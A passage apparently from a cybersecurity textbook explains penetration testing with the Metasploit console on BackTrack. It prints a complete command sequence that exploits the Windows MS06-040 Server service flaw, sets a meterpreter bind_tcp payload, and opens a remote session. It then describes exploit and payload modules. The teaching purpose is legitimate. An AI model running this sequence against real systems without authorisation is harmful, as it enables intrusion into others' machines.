  md: '# 168 Part II = Cyber Security Hands-On


    interface (GUI), a command line, the Metasploit Console is the favored interface.
    For automating and scripting attacks, the Metasploit command line is quite useful.

    By the time you reach the test phase, you should know a great deal about your
    target systems, including their OSEs, services, versions, and known vulnerabilities,
    for example, MITRE Common Vulnerabilities and Exposures (CVE) and MS Security
    Bullets. Metasploit''s exploit database is searchable with these attributes.


    The series of commands that you would use in the Metasploit Console to conduct
    a penetration on BackTrack looks like this:


    ```

    # cd /pentest/exploits/framework3

    # ./msconsole

    msf > search ms06-040

    msf > use exploit/windows/smb/ms06_040_netapi

    msf exploit(ms06_040_netapi) > show payloads

    msf exploit(ms06_040_netapi) > set PAYLOAD windows/meterpreter/bind_tcp

    msf exploit(ms06_040_netapi) > show options

    msf exploit(ms06_040_netapi) > set RHOST 10.10.100.100

    msf exploit(ms06_040_netapi) > show targets

    msf exploit(ms06_040_netapi) > set TARGET 5

    msf exploit(ms06_040_netapi) > show options

    msf exploit(ms06_040_netapi) > save

    msf exploit(ms06_040_netapi) > check

    msf exploit(ms06_040_netapi) > exploit

    msf exploit(ms06_040_netapi) > sessions -l

    msf exploit(ms06_040_netapi) > sessions -i 1

    meterpreter > ?

    ```


    This Metasploit Console example exploits ms06-040, a vulnerability in the Server
    service on Windows. A search for this bullet turns up candidate exploits. You
    can set the exploit and display information about it.


    There are several pieces to each Metasploit attack. First, there is the exploit
    code (for example, a module named ms06_040_netapi). This code breaks into the
    system, taking advantage of a known software defect. Each exploit can have one
    or more payloads. Many payloads are a single piece, but some are executed on the
    target system after exploitation (for example, a module named windows/meterpreter/bind_tcp).


    The commands to determine which parameters are required. In many cases, you must
